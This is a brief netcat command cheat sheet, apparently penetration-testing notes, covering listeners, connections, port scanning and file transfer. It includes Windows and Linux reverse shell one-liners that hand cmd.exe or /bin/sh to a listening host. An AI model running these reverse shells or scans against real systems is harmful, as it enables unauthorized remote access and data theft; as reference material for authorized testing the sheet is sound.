### Source
https://github.com/diegocr/netcat  

### Start listener
```
nc -lvp <lport>
```

### Connect to given port using TCP, -v verbose, -n dont resolve
```
nc -nv <rhost> <rport>
```

### Port scan, -z zero I/O mode, -w wait
```
nc -z -n -v -w1 <rhost> <rport>-<rport>
```

### Windows reverse shell
```
nc -nv <lhost> <lport> -e cmd.exe
```

### Linux reverse shell
```
nc -nv <lhost> <lport> -e /bin/sh
```

### Send file (-N close connection after transfer done)
```
nc -N <lhost> <lport> < <file>
```

### Receive file
```
nc -vlp <lport> > <file>
```

### Receive file base64 encoded
```
nc -lnp <lport> | base64 -i -d > <file>
```

